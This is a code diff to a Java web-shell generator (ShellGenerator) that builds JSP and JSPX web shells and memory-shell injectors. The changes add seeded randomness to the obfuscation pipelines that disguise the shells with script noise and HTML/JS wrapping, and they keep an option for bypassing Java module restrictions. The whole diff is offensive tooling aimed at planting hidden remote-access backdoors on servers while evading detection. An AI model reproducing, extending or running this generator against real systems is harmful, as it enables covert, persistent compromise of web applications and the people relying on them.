@@ -3,6 +3,7 @@ package org.leo.jmg;
 import org.leo.core.entity.Disguise;
 import org.leo.core.util.asm.ClassFileMinimizer;
 import org.leo.core.util.request.ClassNameGenerator;
+import org.leo.core.util.request.GenerationRandom;
 import org.leo.jmg.core.LeoCore;
 import org.leo.jmg.jsp.http.JspServer;
 import org.leo.jmg.jsp.http.JspxServer;
@@ -13,7 +14,6 @@ import org.leo.jmg.mem.packer.PackerRegistry;
 import org.leo.jmg.mem.packer.jsp.JspObfuscationPipeline;
 
 import java.util.Base64;
-import java.util.List;
 
 /**
  * Shell生成器
@@ -60,17 +60,19 @@ public class ShellGenerator {
      * @throws Exception 生成异常
      */
     public String generateJspShell() throws Exception {
-        byte[] coreClass = generateCoreClass();
-        String protocol = config.getProtocol();
-        String raw;
-        if ("httpchunk".equals(protocol)) {
-            org.leo.jmg.jsp.httpchunk.JspServer jspServer = new org.leo.jmg.jsp.httpchunk.JspServer();
-            raw = jspServer.wrap(coreClassName, coreClass, respCode);
-        } else {
-            JspServer jspServer = new JspServer();
-            raw = jspServer.wrap(coreClassName, coreClass, respCode);
+        try (GenerationRandom.Scope ignored = GenerationRandom.withSeed(config.getObfuscationSeed())) {
+            byte[] coreClass = generateCoreClass();
+            String protocol = config.getProtocol();
+            String raw;
+            if ("httpchunk".equals(protocol)) {
+                org.leo.jmg.jsp.httpchunk.JspServer jspServer = new org.leo.jmg.jsp.httpchunk.JspServer();
+                raw = jspServer.wrap(coreClassName, coreClass, respCode);
+            } else {
+                JspServer jspServer = new JspServer();
+                raw = jspServer.wrap(coreClassName, coreClass, respCode);
+            }
+            return buildWebShellPipeline(true).apply(raw);
         }
-        return buildWebShellPipeline(raw, true).apply(raw);
     }
 
     /**
@@ -80,17 +82,19 @@ public class ShellGenerator {
      * @throws Exception 生成异常
      */
     public String generateJspxShell() throws Exception {
-        byte[] coreClass = generateCoreClass();
-        String protocol = config.getProtocol();
-        String raw;
-        if ("httpchunk".equals(protocol)) {
-            org.leo.jmg.jsp.httpchunk.JspxServer jspxServer = new org.leo.jmg.jsp.httpchunk.JspxServer();
-            raw = jspxServer.wrap(coreClassName, coreClass, respCode);
-        } else {
-            JspxServer jspxServer = new JspxServer();
-            raw = jspxServer.wrap(coreClassName, coreClass, respCode);
+        try (GenerationRandom.Scope ignored = GenerationRandom.withSeed(config.getObfuscationSeed())) {
+            byte[] coreClass = generateCoreClass();
+            String protocol = config.getProtocol();
+            String raw;
+            if ("httpchunk".equals(protocol)) {
+                org.leo.jmg.jsp.httpchunk.JspxServer jspxServer = new org.leo.jmg.jsp.httpchunk.JspxServer();
+                raw = jspxServer.wrap(coreClassName, coreClass, respCode);
+            } else {
+                JspxServer jspxServer = new JspxServer();
+                raw = jspxServer.wrap(coreClassName, coreClass, respCode);
+            }
+            return buildWebShellPipeline(false).apply(raw);
         }
-        return buildWebShellPipeline(raw, false).apply(raw);
     }
 
     /**
@@ -106,29 +110,18 @@ public class ShellGenerator {
      * 当 {@code isJsp=false}（生成 JSPX）时，自动过滤掉不兼容 JSPX 的步骤
      * （如 INSERT_SCRIPT_NOISE、WRAP_HTML_JS），避免破坏 XML 结构。
      */
-    private JspObfuscationPipeline buildWebShellPipeline(String ignored, boolean isJsp) {
-        List<String> steps = config.getJspObfuscationSteps();
-        List<String> effectiveSteps = steps != null ? steps : java.util.Collections.<String>emptyList();
-
-        if (!isJsp && !effectiveSteps.isEmpty()) {
-            // 构建 stepId -> StepDescriptor 查找表
-            java.util.Map<String, JspObfuscationPipeline.StepDescriptor> descMap =
-                    new java.util.HashMap<String, JspObfuscationPipeline.StepDescriptor>();
-            for (JspObfuscationPipeline.StepDescriptor d : JspObfuscationPipeline.getStepDescriptors()) {
-                descMap.put(d.getId(), d);
-            }
-            // 过滤掉 JSPX 不支持的步骤
-            java.util.List<String> filtered = new java.util.ArrayList<String>();
-            for (String stepId : effectiveSteps) {
-                JspObfuscationPipeline.StepDescriptor desc = descMap.get(stepId);
-                if (desc == null || desc.isJspxCompatible()) {
-                    filtered.add(stepId);
-                }
-            }
-            effectiveSteps = filtered;
-        }
-
-        return JspObfuscationPipeline.fromStepIds(effectiveSteps);
+    private JspObfuscationPipeline buildWebShellPipeline(boolean isJsp) {
+        java.util.List<String> steps = config.getJspObfuscationSteps();
+        java.util.List<String> effectiveSteps = steps != null
+                ? steps
+                : java.util.Collections.<String>emptyList();
+        JspObfuscationPipeline.ArtifactFormat format = isJsp
+                ? JspObfuscationPipeline.ArtifactFormat.JSP
+                : JspObfuscationPipeline.ArtifactFormat.JSPX;
+        return JspObfuscationPipeline.fromStepIds(
+                effectiveSteps,
+                JspObfuscationPipeline.PlanContext.webShell(
+                        format, config.getObfuscationSeed()));
     }
 
     /**
@@ -245,6 +238,7 @@ public class ShellGenerator {
         cfg.setClassBytesBase64Str(Base64.getEncoder().encodeToString(bytecode));
         cfg.setByPassJavaModule(config.isByPassJavaModule());
         cfg.setJspObfuscationSteps(config.getJspObfuscationSteps());
+        cfg.setObfuscationSeed(config.getObfuscationSeed());
         cfg.setCustomTemplate(config.getCustomJspTemplate());
         return packer.pack(cfg);
     }
@@ -256,23 +250,25 @@ public class ShellGenerator {
      * @throws Exception 生成异常
      */
     public String generateFormattedInjector() throws Exception {
-        config.validateForInjector();
-        String packerType = config.getPackerType();
+        try (GenerationRandom.Scope ignored = GenerationRandom.withSeed(config.getObfuscationSeed())) {
+            config.validateForInjector();
+            String packerType = config.getPackerType();
 
-        Packer packer = ServerInjectorMapper.getPacker(packerType);
-        if (packer == null) {
-            throw new IllegalArgumentException("不支持的 packerType: " + packerType);
+            Packer packer = ServerInjectorMapper.getPacker(packerType);
+            if (packer == null) {
+                throw new IllegalArgumentException("不支持的 packerType: " + packerType);
+            }
+            PackerRegistry.validateCompatibility(
+                    packerType,
+                    config.getTargetJavaVersion(),
+                    config.isByPassJavaModule()
+            );
+
+            byte[] injectorClass = generateInjector();
+            // generateInjector() 已将最终类名写回 config，直接读取，避免二次生成不同随机名
+            String injectorClassName = config.getInjectorClassName();
+            return packPayload(injectorClassName, injectorClass, packer);
         }
-        PackerRegistry.validateCompatibility(
-                packerType,
-                config.getTargetJavaVersion(),
-                config.isByPassJavaModule()
-        );
-
-        byte[] injectorClass = generateInjector();
-        // generateInjector() 已将最终类名写回 config，直接读取，避免二次生成不同随机名
-        String injectorClassName = config.getInjectorClassName();
-        return packPayload(injectorClassName, injectorClass, packer);
     }
 
     // Getter方法
